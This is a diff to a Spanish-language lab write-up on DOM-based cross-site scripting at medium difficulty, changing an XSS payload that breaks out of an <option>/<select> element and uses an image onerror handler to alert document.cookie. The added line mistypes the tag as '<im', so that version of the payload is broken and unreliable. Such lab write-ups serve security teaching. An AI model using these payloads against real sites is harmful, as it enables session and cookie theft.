@@ -16,7 +16,7 @@ Para poder realizar la explotación con esta dificultad, tenemos que modificar l
 
 En este nivel, el payload se inyecta dentro de una etiqueta <option> ya que no podemos usar la etiqueta de script, ya que está bloqueada, por lo que usaremos una etiqueta de imagen siguiendo el mismo proceso.
 
-payload="></option></select><img src=x onerror="alert(document.cookie)">
+payload="></option></select><im src=x onerror="alert(document.cookie)" >
 
 ![L](./Assets/DOM%20Based%20Cross%20Site%20Scripting%20(XSS)/MEDIUM%20-%201.png)
 
